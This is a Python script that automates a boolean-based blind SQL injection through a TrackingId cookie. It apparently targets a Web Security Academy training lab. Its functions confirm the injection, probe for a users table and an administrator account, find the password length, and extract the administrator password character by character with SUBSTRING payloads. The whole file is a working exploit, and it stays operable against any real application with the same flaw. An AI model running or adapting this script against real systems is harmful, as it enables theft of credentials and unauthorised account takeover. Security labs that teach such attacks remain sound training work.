#!/usr/bin/env python3
"""
Blind SQL Injection Password Brute Force Script
Automates password extraction character by character
NON-ORACLE DATABASE
"""

import requests
import string
import sys
from urllib.parse import quote

# configuration
TARGET_URL = "https://0a09006704a24a7d81472ac200a400fa.web-security-academy.net"
BASE_TRACKING_ID = "YCtmSKirnj4hzm6p"
SESSION_COOKIE = "IzsJ27AkcmL3nX5txjjoIjygTLnaSd2z"
SUCCESS_INDICATOR = "Welcome back"  # text that appears when condition is true

# headers from your request
HEADERS = {
    'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:141.0) Gecko/20100101 Firefox/141.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate, br, zstd',
    'Connection': 'keep-alive',
    'Upgrade-Insecure-Requests': '1',
    'Sec-Fetch-Dest': 'document',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-User': '?1',
    'Priority': 'u=0, i'
}


def test_condition(payload):
    """Test a SQL injection condition and return True if successful"""
    tracking_id = f"{BASE_TRACKING_ID}' AND {payload}-- "

    cookies = {
        'TrackingId': tracking_id,
        'session': SESSION_COOKIE
    }

    try:
        response = requests.get(
            TARGET_URL, headers=HEADERS, cookies=cookies, timeout=10)
        return SUCCESS_INDICATOR in response.text
    except requests.RequestException as e:
        print(f"Request failed: {e}")
        return False


def get_password_length():
    """Determine the length of the administrator password"""
    print("Determining password length...")

    for length in range(1, 51):  # test up to 50 characters
        payload = f"(SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)={length})='a'"
        if test_condition(payload):
            print(f"Password length found: {length}")
            return length

    print("Could not determine password length")
    return None


def extract_password_character_by_character(length):
    """Extract password character by character"""
    password = ""
    charset = string.ascii_lowercase + \
        string.ascii_uppercase + string.digits + "!@#$%^&*()_+-="

    print(f"Extracting {length}-character password character by character...")

    for position in range(1, length + 1):
        print(f"Finding character {position}/{length}...", end="", flush=True)

        found = False
        for char in charset:
            # test if character at position equals char
            payload = f"SUBSTRING((SELECT password FROM users WHERE username='administrator'), {position}, 1) = '{char}'"

            if test_condition(payload):
                password += char
                print(f" Found: '{char}'")
                found = True
                break

        if not found:
            print(f" Could not find character at position {position}")
            break

    return password


def main():
    print("Blind SQL Injection Password Extractor")
    print("=" * 40)

    # test basic injection
    print("Testing basic SQL injection...")
    if not test_condition("'1'='1'"):
        print("❌ Basic SQL injection test failed!")
        sys.exit(1)
    print("✅ SQL injection confirmed!")

    # test if users table exists
    print("Testing if users table exists...")
    if not test_condition("(SELECT 'a' FROM users LIMIT 1)='a'"):
        print("❌ Users table not accessible!")
        sys.exit(1)
    print("✅ Users table accessible!")

    # test if administrator user exists
    print("Testing if administrator user exists...")
    if not test_condition("(SELECT 'a' FROM users WHERE username='administrator')='a'"):
        print("❌ Administrator user not found!")
        sys.exit(1)
    print("✅ Administrator user found!")

    # get password length
    length = get_password_length()
    if not length:
        sys.exit(1)

    # extract password character by character
    password = extract_password_character_by_character(length)

    print("\n" + "=" * 40)
    print(f"🎉 Password extracted: {password}")
    print(f"👤 Username: administrator")
    print(f"🔑 Password: {password}")
    print("=" * 40)


if __name__ == "__main__":
    main()
